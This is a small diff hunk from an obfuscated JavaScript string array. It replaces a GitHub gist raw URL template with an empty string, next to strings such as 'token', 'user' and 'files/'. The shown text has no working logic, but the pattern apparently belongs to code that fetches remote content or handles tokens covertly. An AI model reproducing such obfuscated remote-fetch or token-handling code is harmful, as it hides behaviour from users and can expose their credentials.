@@ -2542,7 +2542,7 @@ function _0xc6a2() {
     "ZwTTT",
     "#destination_continue",
     "user",
-    "https://gist.githubusercontent.com/{1}/raw/{2}",
+    "",
     "files/",
     "SUNcx",
     "token",
